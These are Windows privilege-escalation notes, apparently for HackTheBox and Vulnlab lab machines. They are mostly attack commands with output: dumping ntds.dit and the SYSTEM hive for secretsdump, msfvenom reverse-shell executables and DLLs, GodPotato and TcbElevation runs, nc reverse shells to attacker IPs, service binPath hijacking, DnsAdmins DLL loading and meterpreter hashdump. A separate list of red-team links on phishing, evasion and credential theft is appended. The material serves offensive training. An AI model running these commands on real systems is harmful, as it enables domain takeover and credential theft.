# Privileges
## SeBackupPrivilege
```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
...
SeBackupPrivilege             Back up files and directories  Enabled
...
```
### Disk Shadow method
```
set context persistent nowriters 
add volume c: alias pwn 
create 
expose %pwn% z: 
```
```powershell
*Evil-WinRM* PS C:\temp> upload pwn.txt
```
```powershell
*Evil-WinRM* PS C:\temp> type pwn.txt
set context persistent nowriters 
add volume c: alias pwn 
create 
expose %pwn% z: 
```
```powershell
*Evil-WinRM* PS C:\temp> diskshadow /s pwn.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  8/9/2024 10:57:34 PM

-> set context persistent nowriters
-> add volume c: alias pwn
-> create
Alias pwn for shadow ID {041d93f3-797d-4f91-a270-5c1fb66092e6} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {7df9215a-2efb-4a28-befe-cbaf15deba8c} set as environment variable.

Querying all shadow copies with the shadow copy set ID {7df9215a-2efb-4a28-befe-cbaf15deba8c}

        * Shadow copy ID = {041d93f3-797d-4f91-a270-5c1fb66092e6}               %pwn%
                - Shadow copy set: {7df9215a-2efb-4a28-befe-cbaf15deba8c}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 8/9/2024 10:57:36 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %pwn% z:
-> %pwn% = {041d93f3-797d-4f91-a270-5c1fb66092e6}
The shadow copy was successfully exposed as z:\.
->
```
```powershell
*Evil-WinRM* PS C:\temp> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, August 9, 2024 10:57:58 PM
   Source : z:\windows\ntds\
     Dest : C:\temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\
            New File              16.0 m        ntds.dit

[snipped]
```
```powershell
*Evil-WinRM* PS C:\temp> reg save HKLM\SYSTEM c:\temp\system
The operation completed successfully.
```
```powershell
*Evil-WinRM* PS C:\temp> download system

Info: Downloading C:\temp\system to system

Info: Download successful!
```
```powershell
*Evil-WinRM* PS C:\temp> download ntds.dit

Info: Downloading C:\temp\ntds.dit to ntds.dit

Info: Download successful!
```
```
➜  secretsdump.py -system system -ntds ntds.dit local
```
## SeLoadDriverPrivilege
-> https://github.com/k4sth4/SeLoadDriverPrivilege
```bash
➜  msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
```
```powershell
*Evil-WinRM* PS C:\temp> upload Capcom.sys
*Evil-WinRM* PS C:\temp> upload ExploitCapcom.exe
*Evil-WinRM* PS C:\temp> upload eoploaddriver_x64.exe
*Evil-WinRM* PS C:\temp> upload shell.exe
```
```powershell
*Evil-WinRM* PS C:\temp> .\eoploaddriver_x64.exe System\CurrentControlSet\dfserv C:\temp\Capcom.sys
```
```powershell
*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe LOAD \temp\Capcom.sys
```
```powershell
*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe EXPLOIT .\shell.exe
```
## SeImpersonatePrivilege
```powershell
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
...
```
```powershell
PS C:\programdata> iwr http://<tun0>/GodPotato-NET4.exe -outfile gp.exe
```
```powershell
PS C:\programdata> .\gp.exe -cmd "C:\Users\Public\nc64.exe -e cmd.exe <tun0> <port>"
[*] CombaseModule: 0x140733127524352
[*] DispatchTable: 0x140733130111304
[*] UseProtseqFunction: 0x140733129406688
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\eb27b3cc-7b5a-420d-8f01-d3094f6ee323\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00000402-0d08-ffff-8e84-859d1b28d501
[*] DCOM obj OXID: 0xd402854b19147ceb
[*] DCOM obj OID: 0x20ef4be3bfc76a84
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 892 Token:0x496  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3040
```
```powershell
➜  nc -nlvp 443
listening on [any] 443 ...
connect to [10.8.0.210] from (UNKNOWN) [10.10.150.182] 54910
Microsoft Windows [Version 10.0.20348.2340]
(c) Microsoft Corporation. All rights reserved.

C:\programdata>whoami
nt authority\system
```
## SeDebugPrivilege
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f exe LHOST=<ip> LPORT=<port> -o shell.exe
```
```powershell
PS C:\temp> iwr http://<ip>/shell.exe -outfile shell.exe
PS C:\temp> .\shell.exe
```
```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
msf6 exploit(multi/handler) > set lport 443
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on <attacker_ip>:<port>
[*] Sending stage (200774 bytes) to <target_ip>
[*] Meterpreter session 1 opened [SNIP]
```
```bash
meterpreter > hashdump
```
```bash
meterpreter > portfwd add -L 127.0.0.1 -l 445 -p 445 -r <target_ip>
```
```bash
impacket-smbexec administrator@127.0.0.1 -hashes :<hash>
```
## SeTcbPrivilege
```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
...
SeTcbPrivilege                Act as part of the operating system Enabled
...
```
-> https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178
```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> iwr http://<tun0>/TcbElevation.exe -outfile TcbElevation.exe
```
-> https://github.com/xct/rcat
```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> upload rcat_10.8.0.210_443.exe
```
```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> .\TcbElevation.exe pwn "C:\Windows\system32\cmd.exe /c C:\Users\svc_deploy\Documents\rcat_10.8.0.210_443.exe"
Error starting service 1053
```
```bash
➜  rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.8.0.210] from (UNKNOWN) [10.10.153.117] 53924
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
# Groups
## Server Operators Group
Its members can sign-in to a server, start and stop services, access domain controllers, perform maintenance tasks (such as backup and restore), and they have the ability to change binaries that are installed on the domain controllers.
```powershell
*Evil-WinRM* PS C:\temp> net user svc-printer
...
Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
```
```powershell
*Evil-WinRM* PS C:\temp> upload nc64.exe
```
```powershell
*Evil-WinRM* PS C:\temp> sc.exe config VMTools binPath="C:\temp\nc64.exe -e powershell.exe <tun0> <port>"
[SC] ChangeServiceConfig SUCCESS
```
```powershell
*Evil-WinRM* PS C:\temp> sc.exe stop VMTools

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
```powershell
*Evil-WinRM* PS C:\temp> sc.exe start VMTools
```
```bash
➜  rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.11.108] 49634
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system
```
## DnsAdmins Group
-> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
When we are member of this group we can ask the machine to load an arbitrary DLL file when the service starts so that gives us RCE as SYSTEM. We can re-configure the service and we have the required privileges to restart it.
```bash
➜  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o shell.dll
```
```powershell
*Evil-WinRM* PS C:\temp> upload shell.dll
```
```powershell
*Evil-WinRM* PS C:\temp> cmd /c 'dnscmd <DC> /config /serverlevelplugindll C:\temp\shell.dll'

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
```powershell
*Evil-WinRM* PS C:\temp> sc.exe \\<DC> stop dns

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
```powershell
*Evil-WinRM* PS C:\temp> sc.exe \\<DC> start dns

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3500
        FLAGS
```
```bash
➜  rlwrap nc -nlvp 9001
...

PS C:\Windows\system32> whoami
nt authority\system
```
# Resources
- https://x.com/fr0gger_/status/1379465943965909000
- https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/
- https://github.com/k4sth4/SeLoadDriverPrivilege
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
- https://x.com/splinter_code/status/1568548572861267968
- https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178
- https://snowscan.io/htb-writeup-blackfield/
- https://snowscan.io/htb-writeup-resolute/
- https://www.thehacker.recipes/a-d/movement/domain-settings/builtin-groups
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
## Machines to try:
- Baby (Vulnlab)
- Blackfield (HackTheBox)
- Resolute (HackTheBox)
- Fuse (HackTheBox)
- POV (HackTheBox)
- Job (Vulnlab)
- Sidecar (Vulnlab)


## Awesome Red Teaming


Table of Contents
=================

 * [Initial Access](#-initial-access)
 * [Execution](#-execution)
 * [Persistence](#-persistence)
 * [Privilege Escalation](#-privilege-escalation)
 * [Defense Evasion](#-defense-evasion)
 * [Credential Access](#-credential-access)
 * [Discovery](#-discovery)
 * [Lateral Movement](#-lateral-movement)
 * [Collection](#-collection)
 * [Exfiltration](#-exfiltration)
 * [Command and Control](#-command-and-control)
 * [Embedded and Peripheral Devices Hacking](#-embedded-and-peripheral-devices-hacking)
 * [Misc](#-misc)
 * [RedTeam Gadgets](#-redteam-gadgets)
 * [Ebooks](#-ebooks)
 * [Training](#-training--free-)
 * [Certification](#-certification)
 
 
## [↑](#table-of-contents) Initial Access
* [The Hitchhiker’s Guide To Initial Access](https://posts.specterops.io/the-hitchhikers-guide-to-initial-access-57b66aa80dd6)
* [How To: Empire’s Cross Platform Office Macro](https://www.blackhillsinfosec.com/empires-cross-platform-office-macro/)
* [Phishing with PowerPoint](https://www.blackhillsinfosec.com/phishing-with-powerpoint/)
* [PHISHING WITH EMPIRE](https://enigma0x3.net/2016/03/15/phishing-with-empire/)
* [Bash Bunny](https://hakshop.com/products/bash-bunny)
* [OWASP Presentation of Social Engineering - OWASP](https://owasp.org/www-pdf-archive/Presentation_Social_Engineering.pdf)
* [USB Drop Attacks: The Danger of “Lost And Found” Thumb Drives](https://www.redteamsecure.com/usb-drop-attacks-the-danger-of-lost-and-found-thumb-drives/)
* [Weaponizing data science for social engineering: Automated E2E spear phishing on Twitter - Defcon 24](https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Seymour-Tully-Weaponizing-Data-Science-For-Social-Engineering-WP.pdf)
* [Cobalt Strike - Spear Phishing documentation](https://www.cobaltstrike.com/help-spear-phish)
* [Cobalt Strike Blog - What's the go-to phishing technique or exploit?](https://blog.cobaltstrike.com/2014/12/17/whats-the-go-to-phishing-technique-or-exploit/)
* [Spear phishing with Cobalt Strike - Raphael Mudge](https://www.youtube.com/watch?v=V7UJjVcq2Ao)
* [EMAIL RECONNAISSANCE AND PHISHING TEMPLATE GENERATION MADE SIMPLE](https://cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/)
* [Phishing for access](http://www.rvrsh3ll.net/blog/phishing/phishing-for-access/)
* [Excel macros with PowerShell](https://4sysops.com/archives/excel-macros-with-powershell/)
* [PowerPoint and Custom Actions](https://phishme.com/powerpoint-and-custom-actions/)
* [Macro-less Code Exec in MSWord](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)
* [Multi-Platform Macro Phishing Payloads](https://medium.com/@malcomvetter/multi-platform-macro-phishing-payloads-3b688e8eff68)
* [Abusing Microsoft Word Features for Phishing: “subDoc”](https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-phishing-subdoc/)
* [Phishing Against Protected View](https://enigma0x3.net/2017/07/13/phishing-against-protected-view/)
* [POWERSHELL EMPIRE STAGERS 1: PHISHING WITH AN OFFICE MACRO AND EVADING AVS](https://fzuckerman.wordpress.com/2016/10/06/powershell-empire-stagers-1-phishing-with-an-office-macro-and-evading-avs/)
* [The PlugBot: Hardware Botnet Research Project](https://www.redteamsecure.com/the-plugbot-hardware-botnet-research-project/)
* [Luckystrike: An Evil Office Document Generator](https://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-generator)
* [The Absurdly Underestimated Dangers of CSV Injection](http://georgemauer.net/2017/10/07/csv-injection.html)
* [Macroless DOC malware that avoids detection with Yara rule](https://furoner.wordpress.com/2017/10/17/macroless-malware-that-avoids-detection-with-yara-rule/amp/)
* [Phishing between the app whitelists](https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279)
* [Executing Metasploit & Empire Payloads from MS Office Document Properties (part 1 of 2)](https://stealingthe.network/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/)
* [Executing Metasploit & Empire Payloads from MS Office Document Properties (part 2 of 2)](https://stealingthe.network/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/)
* [Social Engineer Portal](https://www.social-engineer.org/)
* [7 Best social Engineering attack](http://www.darkreading.com/the-7-best-social-engineering-attacks-ever/d/d-id/1319411)
* [Using Social Engineering Tactics For Big Data Espionage - RSA Conference Europe 2012](https://www.rsaconference.com/writable/presentations/file_upload/das-301_williams_rader.pdf)
* [USING THE DDE ATTACK WITH POWERSHELL EMPIRE](https://1337red.wordpress.com/using-the-dde-attack-with-powershell-empire/)
* [Phishing on Twitter - POT](https://www.kitploit.com/2018/02/pot-phishing-on-twitter.html)
* [Microsoft Office – NTLM Hashes via Frameset](https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/)
* [Defense-In-Depth write-up](https://oddvar.moe/2017/09/13/defense-in-depth-writeup/)
* [Spear Phishing 101](https://blog.inspired-sec.com/archive/2017/05/07/Phishing.html)

 
## [↑](#table-of-contents) Execution 
* [Research on CMSTP.exe,](https://msitpros.com/?p=3960)
* [Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
* [Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts](https://bohops.com/2017/12/02/clickonce-twice-or-thrice-a-technique-for-social-engineering-and-untrusted-command-execution/)
* [WSH Injection: A Case Study](https://posts.specterops.io/wsh-injection-a-case-study-fd35f79d29dd)
* [Gscript Dropper](http://lockboxx.blogspot.com/2018/02/intro-to-using-gscript-for-red-teams.html)

 
## [↑](#table-of-contents) Persistence
* [A View of Persistence](https://rastamouse.me/blog/view-of-persistence/)
* [hiding registry keys with psreflect](https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353)
* [Persistence using RunOnceEx – Hidden from Autoruns.exe](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/)
* [Persistence using GlobalFlags in Image File Execution Options – Hidden from Autoruns.exe](https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/)
* [Putting data in Alternate data streams and how to execute it – part 2](https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/)
* [WMI Persistence with Cobalt Strike](https://blog.inspired-sec.com/archive/2017/01/20/WMI-Persistence.html)
* [Leveraging INF-SCT Fetch & Execute Techniques For Bypass, Evasion, & Persistence](https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/)
* [Leveraging INF-SCT Fetch & Execute Techniques For Bypass, Evasion, & Persistence (Part 2)](https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/)
* [Vshadow: Abusing the Volume Shadow Service for Evasion, Persistence, and Active Directory Database Extraction](https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/)
 
## [↑](#table-of-contents) Privilege Escalation

### User Account Control Bypass
* [First entry: Welcome and fileless UAC bypass,](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
* [Exploiting Environment Variables in Scheduled Tasks for UAC Bypass,](https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html)
* Reading Your Way Around UAC in 3 parts:
   [Part 1.](https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html)
   [Part 2.](https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html)
   [Part 3.](https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html)
* [Bypassing UAC using App Paths,](https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/)
* ["Fileless" UAC Bypass using sdclt.exe,](https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/)
* [UAC Bypass or story about three escalations,](https://habrahabr.ru/company/pm/blog/328008/)
* ["Fileless" UAC Bypass Using eventvwr.exe and Registry Hijacking,](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/)
* [Bypassing UAC on Windows 10 using Disk Cleanup,](https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/)
* [Using IARPUninstallStringLauncher COM interface to bypass UAC,](http://www.freebuf.com/articles/system/116611.html)
* [Fileless UAC Bypass using sdclt](https://posts.specterops.io/fileless-uac-bypass-using-sdclt-exe-3e9f9ad4e2b3)
* [Eventvwr File-less UAC Bypass CNA](https://www.mdsec.co.uk/2016/12/cna-eventvwr-uac-bypass/)
* [Windows 7 UAC whitelist](http://www.pretentiousname.com/misc/win7_uac_whitelist2.html)

### Escalation
* [Windows Privilege Escalation Checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
* [From Patch Tuesday to DA](https://blog.inspired-sec.com/archive/2017/03/17/COM-Moniker-Privesc.html)
* [A Path for Privilege Escalation](https://blog.cobaltstrike.com/2016/12/08/cobalt-strike-3-6-a-path-for-privilege-escalation/)

## [↑](#table-of-contents) Defense Evasion
* [Window 10 Device Guard Bypass](https://github.com/tyranid/DeviceGuardBypasses)
* [App Locker ByPass List](https://github.com/api0cradle/UltimateAppLockerByPassList)
* [Window Signed Binary](https://github.com/vysec/Windows-SignedBinary)
* [Bypass Application Whitelisting Script Protections - Regsvr32.exe & COM Scriptlets (.sct files)](http://subt0x10.blogspot.sg/2017/04/bypass-application-whitelisting-script.html)
* [Bypassing Application Whitelisting using MSBuild.exe - Device Guard Example and Mitigations](http://subt0x10.blogspot.sg/2017/04/bypassing-application-whitelisting.html)
* [Empire without powershell](https://bneg.io/2017/07/26/empire-without-powershell-exe/)
* [Powershell without Powershell to bypass app whitelist](https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/)
* [MS Signed mimikatz in just 3 steps](https://github.com/secretsquirrel/SigThief)
* [Hiding your process from sysinternals](https://riscybusiness.wordpress.com/2017/10/07/hiding-your-process-from-sysinternals/)
* [code signing certificate cloning attacks and defenses](https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec)
* [userland api monitoring and code injection detection](https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565)
* [In memory evasion](https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/)
* [Bypassing AMSI via COM Server Hijacking](https://posts.specterops.io/bypassing-amsi-via-com-server-hijacking-b8a3354d1aff)
* [process doppelganging](https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/)
* [Week of Evading Microsoft ATA - Announcement and Day 1 to Day 5](http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html)
* [VEIL-EVASION AES ENCRYPTED HTTPKEY REQUEST: SAND-BOX EVASION](https://cybersyndicates.com/2015/06/veil-evasion-aes-encrypted-httpkey-request-module/)
* [Putting data in Alternate data streams and how to execute it](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)
* [AppLocker – Case study – How insecure is it really? – Part 1](https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/)
* [AppLocker – Case study – How insecure is it really? – Part 2](https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/)
* [Harden Windows with AppLocker – based on Case study part 2](https://oddvar.moe/2017/12/13/harden-windows-with-applocker-based-on-case-study-part-1/)
* [Harden Windows with AppLocker – based on Case study part 2](https://oddvar.moe/2017/12/21/harden-windows-with-applocker-based-on-case-study-part-2/)
* [Office 365 Safe links bypass](https://oddvar.moe/2018/01/03/office-365-safe-links-bypass/)
* [Windows Defender Attack Surface Reduction Rules bypass](https://oddvar.moe/2018/03/15/windows-defender-attack-surface-reduction-rules-bypass/)
* [Bypassing Device guard UMCI using CHM – CVE-2017-8625](https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/)
* [Bypassing Application Whitelisting with BGInfo](https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/)
* [Cloning and Hosting Evil Captive Portals using a Wifi PineApple](https://blog.inspired-sec.com/archive/2017/01/10/cloning-captive-portals.html)
* [https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/](https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/)
* [Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts](https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/)
* [mavinject.exe Functionality Deconstructed](https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e)
  
## [↑](#table-of-contents) Credential Access
* [Windows Access Tokens and Alternate credentials](https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/)
* [Bringing the hashes home with reGeorg & Empire](https://sensepost.com/blog/2016/bringing-the-hashes-home-with-regeorg-empire/)
* [Intercepting passwords with Empire and winning](https://sensepost.com/blog/2016/intercepting-passwords-with-empire-and-winning/)
* [Local Administrator Password Solution (LAPS) Part 1](https://rastamouse.me/blog/laps-pt1/)
* [Local Administrator Password Solution (LAPS) Part 2](https://rastamouse.me/blog/laps-pt2/)
* [USING A SCF FILE TO GATHER HASHES](https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/)
* [Remote Hash Extraction On Demand Via Host Security Descriptor Modification](https://www.harmj0y.net/blog/)
* [Offensive Encrypted Data Storage](https://www.harmj0y.net/blog/redteaming/offensive-encrypted-data-storage/)
* [Practical guide to NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
* [Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync](https://adsecurity.org/?p=2053)
* [Dumping Domain Password Hashes](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
  
## [↑](#table-of-contents) Discovery
* [Red Team Operating in a Modern Environment](https://www.owasp.org/images/4/4b/Red_Team_Operating_in_a_Modern_Environment.pdf)
* [My First Go with BloodHound](https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/)
* [Introducing BloodHound](https://wald0.com/?p=68)
* [A Red Teamer’s Guide to GPOs and OUs](https://wald0.com/?p=179)
* [Automated Derivative Administrator Search](https://wald0.com/?p=14)
* [A Pentester’s Guide to Group Scoping](https://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/)
* [Local Group Enumeration](https://www.harmj0y.net/blog/redteaming/local-group-enumeration/)
* [The PowerView PowerUsage Series #1 - Mass User Profile Enumeration](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/)
* [The PowerView PowerUsage Series #2 – Mapping Computer Shortnames With the Global Catalog](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-2/)
* [The PowerView PowerUsage Series #3 – Enumerating GPO edit rights in a foreign domain](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/)
* [The PowerView PowerUsage Series #4 – Finding cross-trust ACEs](http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/)
* [Aggressor PowerView](http://threat.tevora.com/aggressor-powerview/)
* [Lay of the Land with BloodHound](http://threat.tevora.com/lay-of-the-land-with-bloodhound/)
* [Scanning for Active Directory Privileges & Privileged Accounts](https://adsecurity.org/?p=3658)
* [Microsoft LAPS Security & Active Directory LAPS Configuration Recon](https://adsecurity.org/?p=3164)
* [Trust Direction: An Enabler for Active Directory Enumeration and Trust Exploitation](https://bohops.com/2017/12/02/trust-direction-an-enabler-for-active-directory-enumeration-and-trust-exploitation/)
* [SPN Discovery](https://pentestlab.blog/2018/06/04/spn-discovery/)
   
## [↑](#table-of-contents) Lateral Movement 

* [A Citrix Story](https://rastamouse.me/blog/a-citrix-story/)
* [Jumping Network Segregation with RDP](https://rastamouse.me/blog/rdp-jump-boxes/)
* [Pass hash pass ticket no pain](http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/)
* [Abusing DNSAdmins privilege for escalation in Active Directory](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
* [Using SQL Server for attacking a Forest Trust](http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html)
* [Extending BloodHound for Red Teamers](https://www.youtube.com/watch?v=Pn7GWRXfgeI)
* [OPSEC Considerations for beacon commands](https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/)
* [My First Go with BloodHound](https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/)
* [Kerberos Party Tricks: Weaponizing Kerberos Protocol Flaws](http://www.exumbraops.com/blog/2016/6/1/kerberos-party-tricks-weaponizing-kerberos-protocol-flaws)
* [Lateral movement using excel application and dcom](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)
* [Lay of the Land with BloodHound](http://threat.tevora.com/lay-of-the-land-with-bloodhound/)
* [The Most Dangerous User Right You (Probably) Have Never Heard Of](https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/)
* [Agentless Post Exploitation](https://blog.cobaltstrike.com/2016/11/03/agentless-post-exploitation/)
* [A Guide to Attacking Domain Trusts](https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)   
* [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
* [Targeted Kerberoasting](https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/)
* [Kerberoasting Without Mimikatz](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
* [Abusing GPO Permissions](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [Abusing Active Directory Permissions with PowerView](https://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/)
* [Roasting AS-REPs](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
* [Getting the goods with CrackMapExec: Part 1](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
